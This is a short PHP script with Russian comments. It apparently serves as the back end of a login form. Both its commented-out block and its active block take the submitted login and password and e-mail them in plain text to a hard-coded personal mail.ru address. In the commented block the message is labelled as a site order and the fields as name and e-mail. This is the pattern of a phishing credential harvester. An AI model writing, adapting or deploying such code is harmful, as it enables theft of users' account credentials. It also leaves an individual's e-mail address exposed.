<?php
/*
	echo "Ваши данные для входа: <br /> ";
if($_SERVER['REQUEST_METHOD'] == 'POST') {
		$login = $_POST['login']; 
		$pd = $_POST['pd'];
	echo "Логин: ".$login."<br />"."Пароль: ".$pd."<br />"; }

	if (mail("mikhailnovikov2003@mail.ru", "Заказ с сайта", "ФИО:".$login.". E-mail: ".$pd ,"From: mikhailnovikov2003@mail.ru \r\n"))
	 {
    echo "Сообщение успешно отправлено";
} else {
    echo "При отправке сообщения возникли ошибки";
}
*/
?>



<?php

if (isset($_POST['login'])) {$login = $_POST['login'];}
if (isset($_POST['pd'])) {$pd = $_POST['pd'];}
 
$myaddres  = "mikhailnovikov2003@mail.ru";
 
/* А здесь прописывается текст сообщения, \n - перенос строки */
$mes = $login."<br>".$pd;


mail ($myaddres,"My Subject","$mes");
 

?>
